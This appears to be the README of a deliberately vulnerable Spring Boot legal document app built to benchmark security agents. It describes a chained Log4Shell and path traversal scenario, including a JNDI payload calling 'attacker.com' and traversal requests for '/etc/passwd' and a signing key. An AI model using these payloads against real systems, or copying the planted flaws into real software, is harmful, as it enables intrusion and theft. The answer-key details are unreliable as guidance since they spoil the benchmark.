# App 09 — Legal Document Management System

## Overview

A full-stack legal files and document versioning platform built with **Spring Boot** (backend) and a decoupled client-side Single Page Application (**HTML5 + vanilla JS + CSS SPA**) served under `static/`. The system manages legal cases, lawsuits progress, NDAs, corporate briefs, and client access portals.

This application is built for security-agent benchmarking and evaluation purposes.

---

## Business Domain

**Legal / Professional Services** — Used by lawyers, legal counsel, and corporate clients to manage sensitive case document versions and review filings.

## Tech Stack

| Layer | Technology |
|-------|------------|
| Backend | Java 17, Spring Boot 3.x, Spring MVC, Spring Security, Apache Log4j 2 |
| Frontend | Decoupled client-side Single Page Application (HTML5, JavaScript, CSS) |
| Database | H2 (embedded, in-memory) |
| Build | Maven |
| Containerisation | Docker |

---

## Features

### Case Management
- View active court cases, filing numbers, statuses
- Create new cases (attorneys only)

### Document Vault
- Browse files under selected cases
- Download/view legal briefs, depositions, contracts
- Upload new legal briefs (attorneys or clients)

### Security Benchmarking

This application has been developed to contain hidden, realistic vulnerabilities mapped to the OWASP Top 10 categories, designed to challenge security agents and code analysis systems.

For ground-truth details regarding the vulnerabilities, see the `.vulns` file in this directory.

---

## Chained Vulnerability Scenario

### Chain: "Log4Shell Trigger → Path Traversal → Legal Document Exfiltration"

Two small weaknesses bridge the known Log4Shell vulnerability into full read access on the server filesystem.

| Step | Issue | Severity (standalone) | OWASP | Location |
|------|-------|-----------------------|-------|----------|
| 1 | Case title is logged verbatim via `logger.info("Creating case: " + dto.getTitle())` using Log4j 2.14.1; a title containing `${jndi:ldap://attacker.com/x}` triggers a JNDI lookup (Log4Shell RCE) | Medium | A06 | `CaseController.java` → `createCase()` |
| 2 | `GET /api/documents/file?name=` concatenates the parameter directly to `/app/legal-documents/` without `Path.normalize()` or a prefix check; allows `../../etc/passwd` or any server path | High | A01 | `DocumentController.java` → `serveDocumentFile()` |

**Attack narrative**: An attacker with an attorney account submits a `POST /api/cases` request whose `title` field contains a JNDI expression pointing to an attacker-controlled LDAP server. The Log4j 2.14.1 logger evaluates the expression, establishing an outbound connection; a loaded class executes a payload that calls `GET /api/documents/file?name=../../app/keys/signing.key` to exfiltrate the document signing key, enabling the attacker to forge legal document signatures.

**Combined Impact**: Remote code execution and full server-side file exfiltration including privileged credential files.

---

## API Endpoints

| Method | Path | Auth | Description |
|--------|------|------|-------------|
| GET | `/` | — | Serves the client-side SPA portal |
| POST | `/login` | — | Authenticates and establishes session |
| GET | `/api/users/me` | ANY | Retrieves authenticated user profile |
| GET | `/api/cases` | ANY | List legal cases (Attorney sees all, client sees mapped) |
| POST | `/api/cases` | ATTORNEY+ | Create a new case file |
| GET | `/api/cases/{id}/documents` | ANY | Browse documents under a legal case |
| GET | `/api/documents/{id}` | ANY | View / download raw legal document content |
| POST | `/api/documents` | ANY | Upload new legal document under case |

---

## Running Locally

```bash
cd apps/java/app-09-legal-documents
./mvnw spring-boot:run
# Frontend served at http://localhost:8083
```

## Running via Docker

```bash
docker build -t app-09-legal-documents .
docker run -p 8083:8083 app-09-legal-documents
```
